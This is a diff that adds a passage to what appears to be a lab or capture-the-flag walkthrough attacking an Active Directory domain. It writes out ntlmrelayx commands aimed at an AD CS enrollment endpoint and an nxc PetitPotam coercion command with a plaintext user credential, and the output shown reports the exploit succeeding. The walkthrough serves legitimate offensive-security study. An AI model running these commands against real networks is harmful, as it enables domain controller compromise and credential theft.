@@ -668,6 +668,44 @@ This will work because i will be coercing DC1 to authenticate to me then ntlmrel
 
 Which in turn should give me a pfx for DC1
 
+```python
+impacket-ntlmrelayx --adcs -smb2support --template User -t http://dc2.dismay.hsm/certsrv/certfnsh.asp
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client RPC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+```
+First ill start ntlmrelayx using valid template and the vulnerable endpoint
+
+```python
+nxc smb dc1.dismay.hsm -d dismay.hsm -u mike.silver -p 'Password123!' -M coerce_plus -o METHOD=PetitPotam LISTENER=10.200.50.211
+SMB         10.1.139.227    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.139.227    445    DC1              [+] dismay.hsm\mike.silver:Password123! 
+COERCE_PLUS 10.1.139.227    445    DC1              VULNERABLE, PetitPotam
+COERCE_PLUS 10.1.139.227    445    DC1              Exploit Success, efsrpc\EfsRpcAddUsersToFile
+```
+
 
 
 
